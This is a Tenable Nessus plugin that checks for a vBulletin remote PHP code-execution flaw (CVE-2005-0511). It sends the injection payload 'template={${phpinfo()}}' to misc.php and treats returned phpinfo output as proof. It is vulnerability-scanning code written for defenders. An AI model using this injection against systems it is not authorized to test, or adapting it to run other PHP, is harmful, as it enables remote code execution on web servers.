#
# (C) Tenable Network Security
#


if(description)
{
 script_id(17211);

 script_cve_id("CVE-2005-0511");
 script_bugtraq_id(12622);
 script_xref(name:"OSVDB", value:"14047");
 script_version("$Revision: 1.4 $");
 name["english"] = "vBulletin Misc.PHP PHP Script Code Execution Vulnerability";
 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

The remote web server contains a PHP script that allows execution of
arbitrary PHP code. 

Description :

The remote version of vBulletin fails to sanitize input to the
'template' parameter of the 'misc.php' script.  Provided the 'Add
Template Name in HTML Comments' setting in vBulletin is enabled, an
unauthenticated attacker may use this flaw to execute arbitrary PHP
commands on the remote host. 

See also :

http://archives.neohapsis.com/archives/fulldisclosure/2005-02/0468.html

Solution : 

Upgrade to vBulletin 3.0.7 or later.

Risk factor : 

Medium / CVSS Base Score : 6
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


 script_description(english:desc["english"]);
 
 summary["english"] = "Executes phpinfo() on the remote host";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencies("vbulletin_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");



port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if ( ! can_host_php(port:port) ) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/vBulletin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];
  req = http_get(item:dir + "/misc.php?do=page&template={${phpinfo()}}", port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if ( res == NULL ) exit(0);
  if ( "<title>phpinfo()</title>" >< res ) security_warning(port);
}
